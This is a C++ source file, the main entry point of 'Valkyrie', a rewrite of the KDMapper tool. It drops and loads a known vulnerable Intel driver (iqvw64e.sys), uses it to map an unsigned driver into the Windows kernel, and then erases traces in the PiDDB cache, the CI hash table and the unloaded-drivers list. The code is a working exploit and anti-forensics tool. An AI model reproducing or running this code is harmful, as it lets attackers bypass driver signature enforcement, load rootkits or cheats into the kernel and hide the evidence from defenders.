// Code by Cyril "Parad0x141" Bouvier - 2025  Valkyrie v0.2.1

// This is a work in progress even if the most of the main features are impl and working,
// you can map drivers right now :)

// Stealth kit is not complete yet.


// Valkyrie is a clean and complete rewrite of KDMapper by TheCruz
// with added stealth features & various code/features improvements by Parad0x141
// Original KDMapper repo -> https://github.com/TheCruZ/kdmapper Many thanks to TheCruz for sharing his work <3


#include "Common.hpp"
#include "Helper.hpp"
#include "Args.hpp"
#include "PEUtils.hpp"
#include "ValkyrieMapper.hpp"
#include "StealthKit.hpp"
#include "DebugTools.hpp"
#include "Init.hpp"




static void MapDriver(IntelLoader& loader, StealthKit& stealthKit, ValkyrieMapper& mapper, Args& args)
{
	// Intel driver
	ULONG timestamp = GetPETimeStamp(loader.GetDriverPath());
	std::string narrowedPath = WStringToString(args.driverPath);

	auto pe = PEUtils::ParsePE(narrowedPath);

	if (!pe || !PEUtils::ValidateDriverPE(*pe))
	{
		LOG_ERROR("Error. invalid driver PE");
		return;
	}

	PEUtils::ShowPEDetails(*pe,args.DriverName());  

	if (!ConfirmYesNo(L"Do you want to map this driver ? "))
	{
		system("cls");
		LOG_WARNING("Mapping aborted by user. Cleaning Intel driver traces...");
		JumpLine();

		ValkStatus status = stealthKit.CleanPiDDBCache(L"iqvw64e.sys", timestamp);
		status = stealthKit.ClearCIHashTable();

		stealthKit.ClearMmUnloadedDrivers();
		loader.UnloadVulnDriver();

		DeleteDriverFile();

		LOG_SUCCESS(L"All operations completed. Press Enter to exit. Farewell !");
		std::wcin.ignore();
		return;
	}


	LOG_INFO("Mapping driver...");

	NTSTATUS exitCode = 0;
	
	ULONG64 mappedBase = mapper.MapDriver(
		*pe,
		0, 0, args.freeMemory, args.noHeaderScramble,
		AllocationMode::AllocateIndependentPages,
		false,&exitCode);

	JumpLine();
	LOG_SUCCESS_HEX("Driver mapped ! Driver entry called, returned : ", exitCode);
	JumpLine();

	// Only show the base address if it's not a one-shot driver.
	if(!args.freeMemory)
		LOG_SUCCESS_HEX("Base address of mapped driver : ", mappedBase);
	if (args.freeMemory)
		LOG_SUCCESS("Memory cleaned, driver unloaded !");

	JumpLine();
	LOG_INFO("Cleaning Intel driver traces...");
	JumpLine();

	ValkStatus status = stealthKit.CleanPiDDBCache(L"iqvw64e.sys", timestamp);
	status = stealthKit.ClearCIHashTable();

	stealthKit.ClearMmUnloadedDrivers();
	loader.UnloadVulnDriver();

	DeleteDriverFile();
	
	JumpLine();
	LOG_SUCCESS(L"All operations completed. Press Enter to exit. Farewell !");
	JumpLine();

	std::wcin.ignore();
	return;
}



int wmain(int argc, wchar_t* arvg[])
{

	rang::setControlMode(rang::control::Force);

	Args args = ParseArgs(__argc, __wargv);

	if (args.help)
	{
		PrintHelp();
		return 0;
	}


	Splash();
	JumpLine();
	std::cout << "Press Enter to continue..." << "\n";
	std::wcin.get();

	if (!IsAdmin())
	{
		LOG_ERROR("Valkyrie need to be launched as administrator.");
		std::wcin.ignore();
		return 1;
	}


	IntelLoader loader;
	loader.SetKernelBaseAddress();


	ValkyrieMapper mapper(loader);
	StealthKit stealthKit(loader);

	LOG_INFO(" Dropping driver...\n");
	if (!WriteDriverFile()) 
	{
		std::wcout << L"[-] Failed to write driver\n" << std::flush;
		return 1;
	}


	LOG_INFO("Loading vulnerable driver...\n");
	if (!loader.LoadVulnDriver())
	{
		std::wcout << L"[-] Failed to load driver\n" << std::flush;
		DeleteDriverFile();
		return 1;
	}


	LOG_INFO("Opening device...");
	if (!loader.OpenDevice()) 
	{
		LOG_ERROR("Failed to open device");
		loader.UnloadVulnDriver();
		DeleteDriverFile();
		return 1;
	}


	uint64_t ntos = PEUtils::GetModuleBaseAddress("ntoskrnl.exe");
	if (!ntos)
	{
		std::wcout << L"[-] Failed to find ntoskrnl.exe\n" << std::flush;
		loader.UnloadVulnDriver();
		DeleteDriverFile();
		return 1;
	}

	
	MapDriver(loader, stealthKit, mapper, args);

	return 0;

}